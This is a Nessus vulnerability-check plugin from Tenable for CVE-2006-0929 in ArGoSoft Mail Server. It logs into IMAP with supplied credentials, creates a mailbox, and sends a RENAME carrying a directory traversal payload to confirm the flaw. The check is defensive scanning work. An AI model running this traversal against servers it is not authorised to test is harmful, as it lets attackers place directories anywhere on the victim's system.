#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20977);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-0929");
  script_bugtraq_id(16809);
  script_xref(name:"OSVDB", value:"23474");

  script_name(english:"ArGoSoft Mail Server Pro IMAP RENAME Command Traversal Arbitrary Directory Creation");
  script_summary(english:"Checks for directory traversal vulnerability in ArGoSoft IMAP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is subject to directory traversal attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ArGoSoft Mail Server, a messaging system
for Windows. 

The IMAP server bundled with the version of ArGoSoft Mail Server
installed on the remote host fails to filter directory traversal
sequences from mailbox names passed to the 'RENAME' command.  An
authenticated attacker can exploit this issue to move mailboxes to any
location on the affected system." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-02/0439.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.argosoft.com/rootpages/mailserver/ChangeList.aspx" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ArGoSoft Mail Server 1.8.8.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:S/C:N/I:P/A:N" );


script_end_attributes();

 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");


if (get_kb_item("imap/false_imap")) exit(0);
port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);


# Make sure the banner is from ArGoSoft.
banner = get_imap_banner(port:port);
if (!banner || "IMAP Module of ArGoSoft Mail Server" >!< banner) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  mailbox = string("nessus-", unixtime());

  # First, we create a mailbox we can rename.
  c = string("nessus", string(tag), " CREATE ", mailbox);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # Now move it to under the application's main directory.
  if (resp && resp =~ "OK" && "Folder created" >< s) {
    c = string(
      "nessus", string(tag), 
      " RENAME ", 
      mailbox, 
      ' "...\\..\\..\\..\\..\\', mailbox, '"'
    );
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }
  }

  # There's a problem if we were successful; ie, "nessus3 OK RENAME completed".
  if (resp && resp =~ "OK" && "RENAME completed" >< s) {
    if (report_verbosity > 0) {
      report = string(
        "Nessus was able to create the following directory on the remote\n",
        "host, under the directory in which ArGoSoft Mail Server is\n",
        "installed :\n",
        "\n",
        "  ", mailbox
      );
    }
    else report = NULL;

    security_warning(port:port, extra:report);
  }
}
else if (resp =~ "BAD" || resp =~ "NO") {
  debug_print("couldn't login with supplied imap credentials!", level:2);
}

# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
n = 0;
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
 n ++;
 if ( n > 200 ) break;
}
close(soc);
